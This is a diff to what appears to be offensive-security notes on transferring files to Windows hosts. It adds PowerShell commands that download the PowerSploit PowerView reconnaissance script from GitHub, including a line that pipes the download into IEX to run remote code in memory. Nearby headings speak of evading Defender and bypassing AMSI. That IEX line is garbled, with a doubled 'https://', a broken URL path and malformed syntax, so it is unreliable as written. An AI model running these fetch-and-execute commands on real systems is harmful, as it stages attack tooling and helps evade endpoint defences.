@@ -38,10 +38,22 @@ Malicious files can be detected by Defender:
 
 ```bash
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
 PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
 PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
 ```
 
+Using Invoke-WebRequest is a slower method, this can launch IE when first launched:
+
+```bash
+PS C:\users\public\downloads> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+```
+
+To prevent IE from loading use the following:
+
+```bash
+PS C:\users\public\downloads> Invoke-WebRequest https://https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1/PowerView.ps1 -UseBasicParsing {| IEX}
+```
 ### Web Downloads - Fileless (memory)
 
 Need to bypass AMSI to load Malicious files into memory:
